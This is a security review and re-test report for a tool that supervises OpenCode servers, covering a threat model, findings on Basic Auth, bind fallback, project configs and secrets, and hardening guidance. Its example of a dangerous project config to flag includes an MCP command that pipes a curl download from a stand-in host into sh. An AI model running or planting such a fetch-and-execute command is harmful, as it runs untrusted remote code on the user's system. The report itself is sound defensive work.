# OpenCode Agent Security Report

Date: 2026-04-24  
Re-test date: 2026-04-24
Project: `opencode-agent`  
Scope: secure design review, threat model, and secure code review of this repository as a trusted service that may be reached by trusted clients over VPN/Tailnet and could be misconfigured onto the open internet.

## Executive Summary

`opencode-agent` is a compact cross-platform supervisor that installs and runs named OpenCode HTTP servers, stores generated Basic Auth credentials in the OS keychain, and manages per-user service entries. The implementation has several strong foundations: generated passwords use `crypto/rand`, instance names are constrained, config/state/log files are generally written with restrictive permissions, secrets are not persisted in the agent config file, and CI already runs tests, vet, and `govulncheck`.

Re-test on 2026-04-24 found that most original findings have been remediated or substantially mitigated. The supervised OpenCode server still uses HTTP and Basic Auth internally because that is the current upstream server interface, but the agent now binds to loopback by default, refuses non-loopback HTTP advertisement unless explicitly allowed, supports HTTPS advertised URLs, and can configure Tailscale Serve/Funnel as an HTTPS proxy in front of loopback OpenCode.

The highest priority remaining risks are:

1. Treat any explicit `--allow-insecure-remote-http` or `--allow-all-interfaces-fallback` deployment as accepted risk requiring local compensating controls.
2. Replace environment-variable password handoff if upstream OpenCode gains a protected secret-file, stdin, or keychain-based mechanism.
3. Add per-client identity/revocation through an identity-aware proxy, mTLS, or upstream token support for shared deployments.
4. Continue treating logs, state, and OpenCode project execution as sensitive because OpenCode remains a command-capable agent running as the user.

## Re-test Summary

| Finding | Current status | Notes |
| --- | --- | --- |
| F-001 Plain HTTP with Basic Auth | Mitigated | Remote unsafe HTTP is refused by default, loopback is default, HTTPS advertised URLs and Tailscale HTTPS proxying are supported; internal OpenCode traffic remains HTTP. |
| F-002 Tailnet bind fallback | Remediated | Automatic `0.0.0.0` fallback is removed; fallback now requires `--allow-all-interfaces-fallback`. |
| F-003 Missing secure project config | Remediated | Missing `<workdir>/opencode.json` is seeded with ask-by-default permissions at `0600` unless disabled. |
| F-004 Unsafe existing project config | Mitigated | Existing configs are preserved and audited with visible warnings for dangerous permissions and MCP definitions. |
| F-005 Passwords printed to stdout | Remediated | Secrets are hidden by default; reveal requires explicit `--reveal`; dry-run does not generate or print passwords. |
| F-006 Password in process environment | Still outstanding | Parent env is filtered, but `OPENCODE_SERVER_PASSWORD` is still required in the child environment. |
| F-007 Shared Basic Auth only | Still outstanding | Credential metadata and warnings were added, but auth is still one shared credential per instance. |
| F-008 At-rest logs/metadata | Mitigated | Restrictive permissions remain, log rotation and broader redaction were added; no encryption-at-rest was added. |
| F-009 Credentialed health checks | Remediated | Remote checks validate expected host, skip credentialed non-loopback HTTP by default, disable redirects, and bypass proxies. |
| F-010 systemd hardening | Remediated | Linux user unit now includes multiple sandboxing and privilege-limiting directives with tests. |
| F-011 Supply-chain controls | Remediated | Actions are SHA-pinned; CI includes gosec, govulncheck, secret scanning, CodeQL, Dependabot, SBOMs, signatures, and attestations. |

## References

- OWASP Top 10:2025: https://owasp.org/Top10/2025/
- OWASP Top 10:2021, still widely used for mapping compatibility: https://owasp.org/Top10/2021/
- OWASP Secrets Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- MITRE CWE Top 25 2025 key insights: https://cwe.mitre.org/top25/archive/2025/2025_key_insights.html
- OpenCode Server docs: https://opencode.ai/docs/server/
- OpenCode CLI docs: https://opencode.ai/docs/cli/
- OpenCode Permissions docs: https://opencode.ai/docs/permissions/
- Local hardening reference inspected: `/Users/batteryshark/Downloads/opencode-hardening/content`

## Methodology

Reviewed the repository source, README, service installation logic, CLI flows, process supervision, keychain integration, health checks, CI/release workflows, and hardening reference material.

Original validation performed:

- `go test ./...` passed.
- `go vet ./...` passed.
- `govulncheck ./...` reported no known vulnerabilities.
- `gosec ./...` reported 8 issues, triaged below.
- No existing `opencode.json` was found in this repository.
- Hardening content under `/Users/batteryshark/Downloads/opencode-hardening/content` was inspected for secure `opencode.json` defaults.

Re-test validation performed on 2026-04-24:

- `go test ./...` passed.
- `go vet ./...` passed.
- `go run golang.org/x/vuln/cmd/govulncheck@latest ./...` reported no vulnerabilities.
- `go run github.com/securego/gosec/v2/cmd/gosec@v2.23.0 ./...` reported 0 issues.
- Source and test inspection covered the relevant remediation paths in `internal/cli`, `internal/supervisor`, `internal/projectconfig`, `internal/health`, `internal/service`, `internal/exposure`, `internal/keychain`, `.github/workflows`, and `README.md`.

## System Overview

`opencode-agent` manages named OpenCode server instances. The installed service entrypoint is:

```text
opencode-agent run --name <name>
```

Primary components:

- CLI: parses install, run, list, status, logs, password rotation, and uninstall commands.
- Instance config: stores per-instance metadata under user config directories.
- Keychain integration: stores Basic Auth credentials in the OS keychain under service `opencode-agent`.
- Service installer: creates LaunchAgent, systemd user unit, or Windows Scheduled Task entries.
- Supervisor: starts `opencode serve`, injects Basic Auth environment variables, tails output, restarts the process, and records state.
- Health checks: query `/global/health` locally and through the advertised URL.

Security-sensitive assets:

- OpenCode server password.
- Provider credentials managed by OpenCode itself.
- Project source code and files accessible to the OpenCode process.
- Session history, tool outputs, and logs.
- `opencode.json` / `.opencode/opencode.json` project configuration.
- Service unit files and installed agent binary.
- Release artifacts and GitHub Actions credentials.

Trust boundaries:

- Local user shell to installed persistent service.
- `opencode-agent` to spawned `opencode serve` child process.
- Local filesystem/keychain to process environment/stdout/logs.
- VPN/Tailnet/client network to HTTP OpenCode API.
- Repository/project-level config to agent runtime permissions and MCP server definitions.
- GitHub Actions release workflow to public binaries.

## Threat Model

### Actors

- Trusted local user installing and operating the agent.
- Trusted remote client connecting over VPN/Tailnet.
- Local malware or compromised dependency running as the same OS user.
- Other local OS users on a shared host.
- Network attacker with access to LAN, VPN path, Tailnet device, tunnel endpoint, or corporate proxy path.
- Malicious repository author who can place `opencode.json` or `.opencode/opencode.json` in a cloned project.
- Supply-chain attacker targeting dependencies, CI, release workflows, or update artifacts.

### Key Abuse Cases

- Capture Basic Auth credentials over cleartext HTTP.
- Reach the service unexpectedly because bind fallback exposes `0.0.0.0`.
- Use a weak or malicious project-level OpenCode config to auto-allow shell commands, edits, or MCP execution.
- Read secrets from stdout, terminal scrollback, logs, process environment, or config files.
- Abuse a shared Basic Auth password with no per-client identity or audit trail.
- Modify service unit files or installed binaries if local filesystem permissions are weakened.
- Replace or tamper with release artifacts through compromised CI or insufficient provenance validation.

### Assumptions

- The process runs with the privileges of the installing user.
- The OpenCode permission system is a risk-reduction and UX control, not a sandbox.
- VPN/Tailnet is a helpful network control but does not provide end-to-end application security by itself.
- A trusted client over VPN may still be compromised, misconfigured, or observed at tunnel/proxy endpoints.

## OWASP Top 10 and CWE Mapping

| Area | Relevant Findings | OWASP Top 10:2025 | CWE |
| --- | --- | --- | --- |
| Cleartext HTTP and Basic Auth | F-001 | A04 Cryptographic Failures | CWE-319, CWE-311, CWE-522 |
| Broad network exposure | F-002 | A02 Security Misconfiguration, A06 Insecure Design | CWE-284, CWE-1188 |
| Missing secure project config | F-003 | A02 Security Misconfiguration, A06 Insecure Design, A08 Software or Data Integrity Failures | CWE-15, CWE-693 |
| Malicious project config / MCP | F-004 | A08 Software or Data Integrity Failures, A06 Insecure Design | CWE-15, CWE-829 |
| Secrets printed to stdout | F-005 | A04 Cryptographic Failures, A09 Logging and Alerting Failures | CWE-532, CWE-522 |
| Secrets in process environment | F-006 | A04 Cryptographic Failures | CWE-526, CWE-200 |
| Shared Basic Auth only | F-007 | A01 Broken Access Control, A07 Authentication Failures | CWE-287, CWE-306, CWE-307 |
| At-rest metadata and logs | F-008 | A04 Cryptographic Failures, A09 Logging and Alerting Failures | CWE-312, CWE-532 |
| Credentialed health checks | F-009 | A10 Mishandling of Exceptional Conditions, A04 Cryptographic Failures | CWE-200, CWE-601 |
| systemd hardening gaps | F-010 | A02 Security Misconfiguration | CWE-250, CWE-732 |
| Supply-chain controls | F-011 | A03 Software Supply Chain Failures, A08 Software or Data Integrity Failures | CWE-494, CWE-829 |

## Findings

### F-001: Remote Access Uses Plain HTTP With Basic Auth

Severity: P0/P1  
Affected files:

- `internal/instance/instance.go`
- `internal/health/health.go`
- `internal/cli/cli.go`
- `README.md`

Evidence:

- `BaseURL` always builds `http://` URLs.
- `install`, `list`, and `status` display/advertise those URLs.
- Health checks call `req.SetBasicAuth(...)` against local and advertised URLs.
- README currently states the project serves OpenCode over HTTP with generated Basic Auth credentials and is intended for LAN/Tailscale-style use.

Impact:

Basic Auth sends a reusable credential with each request. Without TLS, the credential and OpenCode API traffic can be observed or modified by a network attacker on the LAN, VPN path, tunnel endpoint, proxy, or any compromised network participant. VPN/Tailnet reduces exposure but does not provide application-layer confidentiality to every endpoint in the path.

Mapping:

- OWASP A04:2025 Cryptographic Failures.
- CWE-319: Cleartext Transmission of Sensitive Information.
- CWE-311: Missing Encryption of Sensitive Data.
- CWE-522: Insufficiently Protected Credentials.

Recommended remediation:

- Treat remote HTTP as insecure by default.
- Add explicit HTTPS/TLS deployment guidance and make the CLI warn when advertising non-loopback `http://` URLs.
- Prefer loopback binding plus TLS termination by a reverse proxy or tunnel for any remote access.
- Consider first-class config fields for external HTTPS URL and internal bind URL so health checks and user-facing URLs do not conflate local HTTP with remote HTTPS.
- Consider supporting native TLS or mTLS in `opencode-agent` when upstream OpenCode supports it or through a managed sidecar proxy.

Re-test entry (2026-04-24):

Status: Mitigated.

Current-state notes:

- `install` now defaults to `127.0.0.1` for bind and advertised access.
- Non-loopback `http://` advertised URLs are refused unless `--allow-insecure-remote-http` is explicitly set.
- `--advertise-url https://...` is supported for externally terminated TLS.
- `--expose tailscale` keeps OpenCode bound to loopback and advertises an HTTPS Tailscale Serve/Funnel URL.
- `status`/`list` surface warnings for insecure remote HTTP and shared Basic Auth.
- README no longer presents VPN/Tailnet plain HTTP as safe remote access.
- Remaining risk: OpenCode is still started as a plain HTTP Basic Auth server internally, so native TLS/mTLS and per-client identity remain outside this repository unless provided by a proxy/tunnel or future upstream support.

### F-002: Tailnet Bind Fallback Can Broaden Exposure to `0.0.0.0`

Severity: P0/P1  
Affected files:

- `internal/supervisor/supervisor.go`
- `README.md`

Evidence:

- `BindCandidates` appends `0.0.0.0` when the configured bind host is a Tailscale IPv4 address.
- README advertises that the agent tries binding OpenCode to the Tailnet IP and then falls back to `0.0.0.0`.

Impact:

If a Tailnet bind fails, the fallback can expose OpenCode on all interfaces. This may include LAN, Wi-Fi, VM, container, or public interfaces depending on host networking and firewall rules. Because OpenCode can execute commands and access project files, accidental broad exposure is high impact.

Mapping:

- OWASP A02:2025 Security Misconfiguration.
- OWASP A06:2025 Insecure Design.
- CWE-284: Improper Access Control.
- CWE-1188: Initialization of a Resource with an Insecure Default.

Recommended remediation:

- Remove automatic `0.0.0.0` fallback, or require an explicit `--allow-all-interfaces-fallback` flag.
- Fail closed when the preferred bind address is unavailable.
- Add install/status warnings for any non-loopback bind.
- Add firewall guidance and optional preflight checks for non-loopback services.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- `supervisor.BindCandidates` only adds `0.0.0.0` when `AllowAllInterfacesFallback` is true and the configured bind host is a Tailscale IPv4 address.
- `install` exposes the fallback as the explicit `--allow-all-interfaces-fallback` escape hatch.
- Tailscale-managed exposure binds OpenCode to `127.0.0.1` and proxies through `tailscale serve` or `tailscale funnel`.
- `health.reportWarnings` warns when all-interface binding or all-interface fallback is configured.
- `TestBindCandidatesTailnetFallbackRequiresOptIn` covers the fail-closed default.

### F-003: Missing Secure-by-Default Project `opencode.json`

Severity: P1  
Affected files:

- `internal/cli/cli.go`
- `internal/supervisor/supervisor.go`
- Future helper module for OpenCode project config management.

Evidence:

- `opencode-agent install` accepts `--workdir`, validates it, and starts OpenCode with that working directory.
- The agent does not create or validate `<workdir>/opencode.json`.
- Current OpenCode permission docs state unspecified permissions start from permissive defaults: most permissions default to `allow`, while `doom_loop` and `external_directory` default to `ask`; `read` is allow with `.env` files denied by default.
- The hardening reference recommends explicit ask-by-default permissions with safe read-style allows.

Impact:

When a user installs an agent for a project directory without an explicit `opencode.json`, OpenCode may run with more permissive default tool behavior than expected. This is especially risky for a non-interactive HTTP server workflow where an approval prompt may be absent, bypassed, or operationally impractical.

Mapping:

- OWASP A02:2025 Security Misconfiguration.
- OWASP A06:2025 Insecure Design.
- OWASP A08:2025 Software or Data Integrity Failures.
- CWE-15: External Control of System or Configuration Setting.
- CWE-693: Protection Mechanism Failure.

Recommended remediation:

- During `opencode-agent install`, if `<workdir>/opencode.json` is absent, create one with secure defaults:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "permission": {
    "*": "ask",
    "read": "allow",
    "grep": "allow",
    "glob": "allow",
    "list": "allow",
    "external_directory": "ask"
  }
}
```

- Use `0600` file permissions when creating the file.
- Explain in install output that the user can relax the permissions later.
- Add a `--no-project-config-seed` escape hatch if needed, but keep secure seeding as the default.
- Add tests for missing config, existing config, and JSON formatting.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- `projectconfig.Prepare` creates `<workdir>/opencode.json` with the recommended ask-by-default policy when missing.
- The seeded file is created with `0600` permissions and `O_EXCL` so an existing file is not overwritten.
- `install` calls `projectconfig.Prepare` by default and offers `--no-project-config-seed` as an explicit escape hatch.
- Dry-run reports that the file would be seeded without writing it.
- `TestPrepareSeedsMissingConfig`, `TestPrepareDryRunDoesNotWrite`, and install dry-run tests cover this behavior.

### F-004: Existing Project Config Can Weaken Permissions or Register MCP Servers

Severity: P1  
Affected files:

- `internal/cli/cli.go`
- Future helper module for OpenCode project config audit.

Evidence:

- OpenCode loads project-level `opencode.json` and `.opencode/opencode.json`.
- The hardening guide flags project config injection as a supply-chain risk.
- A malicious repo can auto-allow dangerous tools or register MCP servers that execute commands.

Impact:

A cloned repository can carry project config that weakens the user's global safety posture. Dangerous auto-allows such as `bash`, `edit`, `write`, `task`, `skill`, `webfetch`, `websearch`, or `mcp` can increase the likelihood of arbitrary command execution, data exfiltration, or external tool abuse.

Mapping:

- OWASP A08:2025 Software or Data Integrity Failures.
- OWASP A06:2025 Insecure Design.
- CWE-15: External Control of System or Configuration Setting.
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere.

Recommended remediation:

- Never silently overwrite an existing project config.
- Audit `<workdir>/opencode.json` and `<workdir>/.opencode/opencode.json` during install/status.
- Warn on:
  - `permission` set to `"allow"`.
  - `*` set to `"allow"`.
  - dangerous auto-allows for shell, edit/write, agent/task/skill, web fetch/search, or MCP.
  - local MCP commands or remote MCP URLs without HTTPS.
  - credentials embedded in MCP headers/env blocks.
- Offer a separate explicit hardening command to merge safe defaults after backing up the original file.

Re-test entry (2026-04-24):

Status: Mitigated.

Current-state notes:

- Existing `opencode.json`, `opencode.jsonc`, `.opencode/opencode.json`, and `.opencode/opencode.jsonc` files are audited and preserved.
- The audit warns on `permission: "allow"`, wildcard allow, dangerous tool auto-allows, legacy tool enables, local MCP servers, local MCP commands using network-capable tools, remote MCP URLs without HTTPS, invalid remote MCP URLs, and credential-looking MCP header/environment keys.
- Install and status output display project-config warnings.
- `TestPreparePreservesExistingConfig`, `TestAuditWarnsOnDangerousJSONCConfig`, and `TestAuditIncludesDotOpenCodeAndParseWarnings` cover the warning paths.
- Remaining risk: unsafe project config is warned, not blocked or automatically rewritten. The explicit hardening/merge command proposed in the original remediation has not been implemented.

### F-005: Passwords Are Printed to Stdout

Severity: P1  
Affected files:

- `internal/cli/cli.go`

Evidence:

- `install` prints the generated password.
- `install --dry-run` prints the generated password.
- `show-password` prints the password.
- `rotate-password` prints the new password.

Impact:

Terminal output may be captured in logs, shell scrollback, terminal recording, CI output, screenshots, support bundles, or chat transcripts. The dry-run path is especially surprising because users may expect no sensitive output.

Mapping:

- CWE-532: Insertion of Sensitive Information into Log File.
- CWE-522: Insufficiently Protected Credentials.
- OWASP A04:2025 Cryptographic Failures.
- OWASP A09:2025 Security Logging and Alerting Failures.

Recommended remediation:

- For install/rotate, print the password once only in interactive terminals and clearly warn it is sensitive.
- Do not print generated passwords in `--dry-run`; print that a password would be generated.
- Add `--show-secret` or `--reveal` for explicit reveal flows.
- Consider copying to the OS clipboard only with user opt-in and timeout guidance.
- Avoid showing secrets in JSON output.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- `install`, `show-password`, and `rotate-password` hide passwords by default.
- Password output now requires explicit `--reveal`.
- `install --dry-run` does not generate a password and prints only placeholder text such as `[generated at install time; not printed during dry-run]`.
- `TestInstallDryRunShowsNamedPlan` and `TestShowAndRotatePassword` cover the no-reveal default behavior.
- Remaining risk: explicit `--reveal` still prints the secret by design and should be treated as a deliberate operator action.

### F-006: OpenCode Password Is Passed Through Process Environment

Severity: P1  
Affected files:

- `internal/supervisor/supervisor.go`

Evidence:

- `BuildCommand` sets `OPENCODE_SERVER_USERNAME` and `OPENCODE_SERVER_PASSWORD` in the child environment.
- It appends to `os.Environ()`, inheriting all parent environment variables.

Impact:

Process environments can be visible to same-user processes, debugging tools, crash dumps, service managers, or support diagnostics depending on platform and permissions. Inherited environments may also leak unrelated secrets into the OpenCode child process.

Mapping:

- CWE-526: Cleartext Storage of Sensitive Information in an Environment Variable.
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.
- OWASP A04:2025 Cryptographic Failures.

Recommended remediation:

- Prefer a protected credential file, keychain handoff, stdin pipe, or upstream-supported secret file mechanism over environment variables.
- If environment variables remain required by OpenCode, minimize `cmd.Env` to a known allowlist plus required OpenCode variables.
- Explicitly remove common sensitive variables from the child environment unless required.
- Document process environment exposure as a known limitation.

Re-test entry (2026-04-24):

Status: Still outstanding.

Current-state notes:

- `supervisor.BuildEnvironment` still injects `OPENCODE_SERVER_USERNAME` and `OPENCODE_SERVER_PASSWORD` into the child environment.
- The default child environment policy is now `filtered`; common safe variables are passed, parent `OPENCODE_SERVER_*` entries are stripped, and additional variables require `--allow-env` unless the operator explicitly selects `--environment-policy inherit`.
- `TestBuildEnvironmentFiltersSecretsByDefault` covers removal of common secret-bearing parent environment variables and replacement of parent OpenCode server auth variables.
- Remaining risk: the Basic Auth password is still present in the child process environment. This is partially mitigated by environment minimization but requires upstream support or a sidecar/proxy design to fully remediate.

### F-007: Shared Basic Auth Credential Has Limited Identity and Revocation

Severity: P1  
Affected files:

- `internal/keychain/keychain.go`
- `internal/cli/cli.go`
- `internal/supervisor/supervisor.go`

Evidence:

- One username/password is stored per instance.
- Rotation replaces the shared password.
- No per-client tokens, mTLS identity, source allowlisting, rate limiting, or detailed auth audit exists in this repository.

Impact:

All clients share one credential. If a password leaks, there is no attribution or way to revoke only one client. Repeated guessing and credential stuffing defenses are delegated to upstream OpenCode or the network boundary.

Mapping:

- OWASP A01:2025 Broken Access Control.
- OWASP A07:2025 Authentication Failures.
- CWE-287: Improper Authentication.
- CWE-307: Improper Restriction of Excessive Authentication Attempts.

Recommended remediation:

- Prefer reverse proxies that enforce client identity, mTLS, SSO, access policies, and rate limits.
- Support multiple named client credentials or tokens if upstream OpenCode allows it.
- Record authentication mode, credential age, and rotation status in `status`.
- Add rotation metadata and recommended rotation intervals.

Re-test entry (2026-04-24):

Status: Still outstanding.

Current-state notes:

- The agent still stores one shared Basic Auth username/password per instance.
- Credential creation and rotation timestamps are now tracked in the keychain blob and shown in status output.
- `status` always warns that the instance uses shared Basic Auth and recommends an HTTPS identity-aware proxy for per-client identity and rate limits.
- `rotate-password` remains available and no longer reveals the new password unless `--reveal` is provided.
- Remaining risk: there are still no per-client tokens, per-client revocation, source allowlists, native rate limits, or auth audit trails in this repository.

### F-008: At-Rest Metadata and Logs Are Permission-Restricted but Not Encrypted

Severity: P2  
Affected files:

- `internal/instance/instance.go`
- `internal/supervisor/supervisor.go`

Evidence:

- Config and state are written with `0600`.
- Log files are opened with `0600`.
- Config contains working directory, advertised host, bind host, username, binary path, and health settings.
- State/logs may contain process IDs, errors, paths, URLs, and redacted child process output.
- Redaction only replaces exact password strings.

Impact:

File permissions are a good baseline for single-user machines, but logs and state can still disclose project names, filesystem layout, URLs, operational errors, and possibly transformed or partial secrets not caught by exact-string redaction.

Mapping:

- CWE-312: Cleartext Storage of Sensitive Information.
- CWE-532: Insertion of Sensitive Information into Log File.
- OWASP A04:2025 Cryptographic Failures.
- OWASP A09:2025 Security Logging and Alerting Failures.

Recommended remediation:

- Keep `0600` and `0700` defaults.
- Add log retention/rotation.
- Redact a broader set of known sensitive values, including username/password pairs and common token-like values.
- Avoid logging full command output when possible.
- Document that logs are sensitive and should not be attached to issues without review.
- Consider optional encrypted-at-rest state/log storage only if the operational threat model requires protection from same-user filesystem access.

Re-test entry (2026-04-24):

Status: Mitigated.

Current-state notes:

- Config, state, unit, and log files continue to use restrictive `0600`/`0700` permissions.
- Agent logs are now rotated with a 10 MiB limit and 5 retained files.
- Redaction now covers the exact password, `username:password`, base64 Basic Auth pairs, bearer tokens, Authorization/Cookie headers, URL userinfo, common credential-looking key/value pairs, control characters, and very long lines.
- README documents that logs remain sensitive operational data and should be reviewed before sharing.
- Remaining risk: state and logs are not encrypted at rest, and exact redaction cannot guarantee removal of every transformed, partial, or context-dependent secret.

### F-009: Health Checks Can Send Credentials to Configured URLs

Severity: P2  
Affected files:

- `internal/health/health.go`
- `internal/instance/instance.go`

Evidence:

- `BuildReport` calls `Check(cfg.AdvertiseURL, credsPtr, ...)`.
- `Check` attaches Basic Auth when credentials are available.
- URL validation only requires parseable scheme and host.

Impact:

If config is tampered with or a user sets an unsafe advertised URL, status/list checks can send credentials to an unintended host. Redirect handling is not explicitly disabled, so future Go behavior or redirect edge cases should be reviewed carefully.

Mapping:

- CWE-200: Exposure of Sensitive Information.
- CWE-601: URL Redirection to Untrusted Site, by analogy for credential forwarding risk.
- OWASP A04:2025 Cryptographic Failures.
- OWASP A10:2025 Mishandling of Exceptional Conditions.

Recommended remediation:

- Require advertised URL host to match configured advertise host and port.
- For remote health checks with credentials, require `https://` unless explicitly allowed.
- Disable redirects or prevent forwarding credentials across host/scheme changes.
- Add status warnings when remote health checks are skipped due to unsafe URL scheme.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- `health.CheckWithOptions` accepts an expected host and skips the remote check before sending credentials if the health URL host does not match.
- Credentialed non-loopback HTTP health checks are skipped by default unless `AllowInsecureRemoteHTTP` is explicitly configured.
- Redirects are disabled with `http.ErrUseLastResponse`, preventing credential forwarding to redirected targets.
- Proxy use is disabled for health checks by setting `Transport.Proxy` to `nil`.
- `BuildReport` separates local health from advertised/Tailnet health and passes the expected advertised host.
- `TestCheckSkipsCredentialedRemoteHTTP`, `TestCheckDoesNotFollowRedirectsWithCredentials`, and `TestCheckSkipsHostMismatch` cover the core credential-safety behavior.

### F-010: Linux systemd User Unit Lacks Hardening

Severity: P2  
Affected file:

- `internal/service/service.go`

Evidence:

- `systemdUnit` creates a minimal service with `ExecStart`, `Restart`, and `RestartSec`.
- It does not set sandboxing or privilege-limiting directives.

Impact:

The service and child process run with the full privileges of the user. While OpenCode needs project file access, systemd can still reduce blast radius for temporary directories, privilege escalation paths, device access, kernel tunables, and filesystem write areas.

Mapping:

- CWE-250: Execution with Unnecessary Privileges.
- CWE-732: Incorrect Permission Assignment for Critical Resource.
- OWASP A02:2025 Security Misconfiguration.

Recommended remediation:

- Add applicable user-service hardening where compatible:
  - `NoNewPrivileges=true`
  - `PrivateTmp=true`
  - `ProtectSystem=strict` or `full` with explicit writable paths
  - `ProtectHome=read-only` only if compatible with configured workdir
  - `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX`
  - `LockPersonality=true`
  - `MemoryDenyWriteExecute=true` if compatible
  - `UMask=077`
- Document any directives that cannot be enabled due to OpenCode functionality.
- Add tests that generated units include the chosen directives.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- Generated Linux user units now include `UMask=0077`, `NoNewPrivileges=true`, `PrivateTmp=true`, `PrivateDevices=true`, `ProtectSystem=full`, `ProtectControlGroups=true`, `ProtectKernelModules=true`, `ProtectKernelTunables=true`, `ProtectKernelLogs=true`, `ProtectClock=true`, `LockPersonality=true`, `RestrictRealtime=true`, `RestrictSUIDSGID=true`, `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX`, `SystemCallArchitectures=native`, `CapabilityBoundingSet=`, and `AmbientCapabilities=`.
- `TestBuildPlanPerInstanceNames` checks that the selected hardening directives are present in generated Linux units.
- Remaining risk: directives such as `ProtectHome` and stricter filesystem write restrictions are not enabled because OpenCode needs access to the configured working directory and user-level project files.

### F-011: Supply-Chain Controls Are Good but Incomplete

Severity: P2/P3  
Affected files:

- `.github/workflows/ci.yml`
- `.github/workflows/release.yml`
- `scripts/build.sh`
- `go.mod`

Evidence:

- CI runs tests, vet, and `govulncheck`.
- Release workflow signs checksums with cosign and creates provenance attestations.
- GitHub Actions are referenced by version tags rather than immutable commit SHAs.
- No SBOM generation was found.
- `gosec` is not part of CI.
- CodeQL was not found.

Impact:

Release artifacts are security-sensitive because users install an agent that supervises a command-executing service. Tag-pinned actions can move if upstream accounts are compromised. Lack of SBOM and static-analysis gates reduces detection depth.

Mapping:

- OWASP A03:2025 Software Supply Chain Failures.
- OWASP A08:2025 Software or Data Integrity Failures.
- CWE-494: Download of Code Without Integrity Check.
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere.

Recommended remediation:

- Pin GitHub Actions to commit SHAs.
- Add Dependabot for Go modules and GitHub Actions.
- Add CodeQL and `gosec` CI jobs.
- Generate an SBOM for release artifacts.
- Sign individual artifacts as well as checksum files, or document how consumers should verify artifacts through checksums, signatures, and attestations.
- Consider SLSA provenance expectations for release consumers.

Re-test entry (2026-04-24):

Status: Remediated.

Current-state notes:

- GitHub Actions in CI, CodeQL, and release workflows are pinned to commit SHAs with version comments.
- Dependabot is configured for Go modules and GitHub Actions.
- CI runs tests, vet, `govulncheck`, `gosec`, `gitleaks`, and a cross-build smoke test; Windows also runs tests and a build smoke check.
- CodeQL is configured for Go with `security-extended` and `security-and-quality` queries on pull requests, pushes, and a weekly schedule.
- Release builds generate SBOMs with Syft, sign checksums and individual artifacts/SBOMs with cosign, publish provenance attestations, and document verification commands in README.
- Remaining improvement: pinning the `govulncheck@latest` install in CI to a fixed tool version would make the scanner toolchain more reproducible.

## HTTPS/TLS Deployment Patterns

OpenCode `serve` exposes a headless HTTP server and does not natively provide HTTPS through the CLI. The correct secure remote-access pattern is to keep OpenCode bound to loopback or a tightly scoped private interface and terminate HTTPS at a tunnel or reverse proxy.

Recommended patterns:

### Cloudflare Tunnel

Use when a public HTTPS URL is needed without opening inbound firewall ports.

Example:

```bash
opencode-agent install --workdir /path/to/project --bind-host 127.0.0.1 --advertise-host 127.0.0.1
cloudflared tunnel --url http://localhost:4096
```

Security notes:

- Treat the Cloudflare URL as internet-facing.
- Require Cloudflare Access, SSO, mTLS, or equivalent policy controls.
- Keep OpenCode Basic Auth enabled as a second layer.
- Do not bind OpenCode itself to `0.0.0.0`.

### Tailscale Serve or Funnel

Use private Tailnet access where possible. Use Funnel only when public internet exposure is intentional.

The agent can manage this pattern directly with `--expose tailscale` or
`opencode-agent expose tailscale`, while keeping OpenCode bound to loopback and
proxying through `tailscale serve`. Funnel requires explicit public confirmation
through `--tailscale-public` during install or `--public` during `expose`.

Security notes:

- Tailnet-only exposure is preferable to Funnel for trusted-client workflows.
- Funnel is public internet exposure through Tailscale and should require strong auth controls.
- Keep OpenCode bound to loopback and expose through Tailscale where possible.
- Do not assume Tailnet identity replaces application auth or audit logging.

### Nginx / Caddy / Enterprise Reverse Proxy

Use for permanent or enterprise deployments.

Recommended controls:

- TLS with modern protocol/cipher defaults.
- Automatic certificate renewal through Let's Encrypt or internal PKI.
- Optional mTLS for trusted clients.
- Rate limiting and request-size limits.
- Access logs with secret redaction.
- Explicit host allowlist and no wildcard proxying.
- Upstream target set to `http://127.0.0.1:<port>`.

### Corporate HTTPS Proxy Note

`HTTPS_PROXY` and `NO_PROXY` are outbound proxy settings for reaching external LLM providers or corporate network services. They do not secure inbound OpenCode server traffic and should not be documented as a replacement for TLS termination on the OpenCode API.

## Project `opencode.json` Secure Defaults

Current OpenCode permissions are controlled through the `permission` config. The hardening reference recommends ask-by-default with low-risk read-style operations allowed. The default project policy should be created only when missing:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "permission": {
    "*": "ask",
    "read": "allow",
    "grep": "allow",
    "glob": "allow",
    "list": "allow",
    "external_directory": "ask"
  }
}
```

Implementation guidance:

- On install, check `<workdir>/opencode.json`.
- If absent, write the secure default with `0600`.
- If present, parse and audit it, but do not overwrite it.
- Also audit `<workdir>/.opencode/opencode.json`.
- Warn on dangerous auto-allow rules and MCP server definitions.
- Include a clear message that OpenCode permissions are not a sandbox.

Dangerous project config examples to flag:

```json
{
  "permission": {
    "*": "allow",
    "bash": "allow"
  }
}
```

```json
{
  "mcp": {
    "example": {
      "type": "local",
      "command": ["bash", "-c", "curl https://example.invalid/payload | sh"]
    }
  }
}
```

## Secrets Management Review

### Strengths

- Password generation uses `crypto/rand`.
- Passwords are not written into `opencode-agent` config files.
- OS keychain storage is used for credentials.
- Config, state, service unit, and log files are generally created with restrictive permissions.
- Password rotation is available and records creation/rotation metadata.
- Passwords are hidden by default in install, dry-run, show-password, and rotate-password output.
- Child process environment inheritance is filtered by default.
- Logs rotate and redact common secret shapes in addition to exact password values.

### Gaps

- Secrets can still be printed to stdout when an operator explicitly passes `--reveal`.
- The OpenCode server password is still passed to OpenCode through process environment variables.
- Rotation has metadata, but no schedule enforcement or per-client revocation model.
- Logs have broader redaction, but transformed, partial, or context-specific secrets may still evade redaction.
- The keychain entry stores username and password as a JSON blob; this is acceptable for keychain storage and is annotated in code, but should remain covered by tests and documentation.

### Recommendations

- Keep the explicit `--reveal` model and avoid adding secret output to JSON responses.
- Replace environment-variable password handoff if OpenCode gains a protected secret-file, stdin, or keychain integration.
